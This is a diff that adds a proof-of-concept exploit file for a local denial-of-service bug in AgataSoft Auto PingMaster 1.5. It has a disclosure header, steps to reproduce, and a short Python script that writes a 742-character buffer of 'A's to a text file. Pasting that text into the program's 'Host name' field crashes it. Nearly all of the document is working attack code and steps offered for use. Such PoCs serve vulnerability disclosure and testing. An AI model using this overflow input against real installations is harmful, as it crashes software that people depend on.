@@ -1,0 +1,24 @@
+# Exploit Title: AgataSoft Auto PingMaster 1.5 - 'Host name' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2018-08-02
+# Vendor Homepage: http://agatasoft.com/
+# Software Link : http://agatasoft.com/Ping_Master.exe
+# Tested Version: 1.5
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python AgataSoft_Auto_PingMaster_1.5.py
+# 2.- Open AgataSoft_Auto_PingMaster_1.5.txt and copy content to clipboard
+# 3.- Open Ping_Master.exe
+# 4.- Trace Route
+# 5.- Paste ClipBoard on "Host name:"
+# 6.- Get IP from host name
+# 7.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 742
+f = open ("AgataSoft_Auto_PingMaster_1.5.txt", "w")
+f.write(buffer)
+f.close()
